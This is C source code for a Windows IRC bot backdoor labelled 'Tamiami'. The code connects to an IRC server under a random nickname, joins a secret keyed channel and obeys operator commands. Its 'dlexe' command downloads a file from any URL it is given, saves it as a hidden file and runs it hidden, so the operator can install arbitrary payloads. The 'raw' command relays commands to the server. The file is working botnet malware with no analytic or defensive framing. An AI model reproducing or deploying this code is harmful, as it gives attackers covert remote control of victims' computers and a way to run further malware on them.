   bool xSendLine(SOCKET SocketDesc, char LineToSend[]);
   bool xRecvLine(SOCKET SocketDesc, char *RecvBuffer);
   bool xHandlePing(SOCKET SocketDesc, char *RecvBuffer);
   bool DownloadFile(char URL[], char SaveAs[]);

   bool IrcBackdoor(char IrcServer[], char Channel[], char ChannelKey[])
   {
       char            Version[] = "Bot v1.3 in Tamiami v1.3";
       WSADATA         WsaData;
       SOCKET          SocketDesc;
       LPHOSTENT       Hostent;
       sockaddr_in     SockAddr;
       char            RecvBuffer[1024];
       int             RanNumber= 0;
       char            NickName[30];
       int             NickPosition = 0;
       char            CharBuffer[3];
       int             CommandPosition = 0;
       char            Command[512];

       if(WSAStartup(MAKEWORD(1, 0), &WsaData) == 0)
       {
           SocketDesc = socket(AF_INET, SOCK_STREAM, 0);

           if(SocketDesc != INVALID_SOCKET)
           {
               Hostent = gethostbyname(IrcServer);

               if(Hostent != 0)
               {
                   SockAddr.sin_family = AF_INET;
                   SockAddr.sin_port = htons(6667);
                   SockAddr.sin_addr = *(LPIN_ADDR)*Hostent->h_addr_list;

                   if(connect(SocketDesc, (LPSOCKADDR)&SockAddr, sizeof(SockAddr)) != SOCKET_ERROR)
                   {
                       while(NickPosition < 8)
                       {
                           while(RanNumber < 97)
                           {
                               RanNumber = RandomNumber(123);
                           }

                           NickName[NickPosition] = RanNumber;
                           NickPosition++;
                           RanNumber = 0;
                       }

                       NickName[NickPosition] = 0;

                       lstrcpy(RecvBuffer, "NICK ");
                       lstrcat(RecvBuffer, NickName);
                       xSendLine(SocketDesc, RecvBuffer);

                       lstrcpy(RecvBuffer, "USER ");
                       lstrcat(RecvBuffer, NickName);
                       lstrcat(RecvBuffer, " * 8 :");
                       lstrcat(RecvBuffer, NickName);
                       lstrcat(RecvBuffer, " ");
                       lstrcat(RecvBuffer, NickName);
                       xSendLine(SocketDesc, RecvBuffer);

                       while(strstr((char *)RecvBuffer, "MOTD") == 0)
                       {
                           xRecvLine(SocketDesc, RecvBuffer);
                           xHandlePing(SocketDesc, RecvBuffer);
                       }

                       lstrcpy(RecvBuffer, "JOIN ");
                       lstrcat(RecvBuffer, Channel);
                       lstrcat(RecvBuffer, " ");
                       lstrcat(RecvBuffer, ChannelKey);
                       xSendLine(SocketDesc, RecvBuffer);

                       lstrcpy(RecvBuffer, "MODE ");
                       lstrcat(RecvBuffer, Channel);
                       lstrcat(RecvBuffer, " +nsk ");
                       lstrcat(RecvBuffer, ChannelKey);
                       xSendLine(SocketDesc, RecvBuffer);

                       while(1)
                       {
                           xRecvLine(SocketDesc, RecvBuffer);
                           xHandlePing(SocketDesc, RecvBuffer);

                           if(strstr(RecvBuffer, "^^") != 0)
                           {
                               CommandPosition = 0;
                               lstrcpy(CharBuffer, "");

                               while(lstrcmp(CharBuffer, "^^") != 0)
                               {
                                   lstrcpyn(CharBuffer, RecvBuffer + CommandPosition, 3);
                                   CommandPosition++;
                               }

                               lstrcpy(Command, RecvBuffer + CommandPosition + 1);

                               if(strstr(Command, "quit") != 0)
                               {
                                   xSendLine(SocketDesc, "QUIT");
                                   Sleep(1000);
                                   return true;
                               }

                               if(strstr(Command, "raw") != 0)
                               {
                                   xSendLine(SocketDesc, Command + 4);
                                   continue;
                               }

                               if(strstr(Command, "dlexe") != 0)
                               {
                                   lstrcpy(RecvBuffer, NickName);
                                   wsprintf(CharBuffer, "%d", RandomNumber(10));
                                   lstrcat(RecvBuffer, CharBuffer);
                                   lstrcat(RecvBuffer, ".DiA");

                                   if(DownloadFile(Command + 6, RecvBuffer) == true)
                                   {
                                       lstrcpy(RecvBuffer, "PRIVMSG ");
                                       lstrcat(RecvBuffer, Channel);
                                       lstrcat(RecvBuffer, " :Download & execute successful.");
                                       xSendLine(SocketDesc, RecvBuffer);
                                   }
                                   else
                                   {
                                       lstrcpy(RecvBuffer, "PRIVMSG ");
                                       lstrcat(RecvBuffer, Channel);
                                       lstrcat(RecvBuffer, " :Download & execute failed.");
                                       xSendLine(SocketDesc, RecvBuffer);
                                   }
                                   continue;
                               }

                               if(strstr(Command, "version") != 0)
                               {
                                   lstrcpy(RecvBuffer, "PRIVMSG ");
                                   lstrcat(RecvBuffer, Channel);
                                   lstrcat(RecvBuffer, " :");
                                   lstrcat(RecvBuffer, Version);
                                   xSendLine(SocketDesc, RecvBuffer);
                                   continue;
                               }
                           }
                       }
                   }
               }
           }
       }

       WSACleanup();

       return false;
   }

   bool xSendLine(SOCKET SocketDesc, char LineToSend[])
   {
       char    SendBuffer[4096];

       lstrcpy(SendBuffer, LineToSend);
       lstrcat(SendBuffer, "\r\n");

       if(send(SocketDesc, SendBuffer, lstrlen(SendBuffer), 0) != SOCKET_ERROR)
       {
           return true;
       }

       return false;
   }

   bool xRecvLine(SOCKET SocketDesc, char *RecvBuffer)
   {
       char    CharBuffer[2];
       char    CharBufferTemp[2];

       lstrcpy(RecvBuffer, "");

       while(lstrcmp(CharBufferTemp, "\n") != 0)
       {
           if(recv(SocketDesc, CharBuffer, 1, 0) != SOCKET_ERROR)
           {
               lstrcpyn(CharBufferTemp, CharBuffer, 2);
               lstrcat(RecvBuffer, CharBufferTemp);
           }
           else
           {
               return false;
           }
       }

       return true;
   }

   bool xHandlePing(SOCKET SocketDesc, char *RecvBuffer)
   {
       char    PongBuffer[1024];

       if(strstr(RecvBuffer, "PING") != 0)
       {
           lstrcpy(PongBuffer, "PONG ");
           lstrcat(PongBuffer, RecvBuffer + 6);

           if(xSendLine(SocketDesc, PongBuffer) == true)
           {
               return true;
           }
       }

       return false;
   }

   bool DownloadFile(char URL[], char SaveAs[])
   {
       HINTERNET           InetHandle;
       HINTERNET           UrlHandle;
       HANDLE              FileHandle;
       unsigned long       ReadNext = 1;
       unsigned long       BytesWritten = 0;
       char                DownloadBuffer[1024];

       InetHandle = InternetOpen(SaveAs, 0, 0, 0, 0);

       if(InetHandle != 0)
       {
           UrlHandle = InternetOpenUrl(InetHandle, URL, 0, 0, 0, 0);
           FileHandle = CreateFile(SaveAs, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);

           if(FileHandle != INVALID_HANDLE_VALUE)
           {
               while(ReadNext != 0)
               {
                   InternetReadFile(UrlHandle, DownloadBuffer, sizeof(DownloadBuffer), &ReadNext);
                   WriteFile(FileHandle, DownloadBuffer, ReadNext, &BytesWritten, 0);
               }

               CloseHandle(FileHandle);
               CloseHandle(UrlHandle);
               CloseHandle(InetHandle);

               if(WinExec(SaveAs, SW_HIDE) > 31)
               {
                   return true;
               }
           }
       }

       return false;
   }
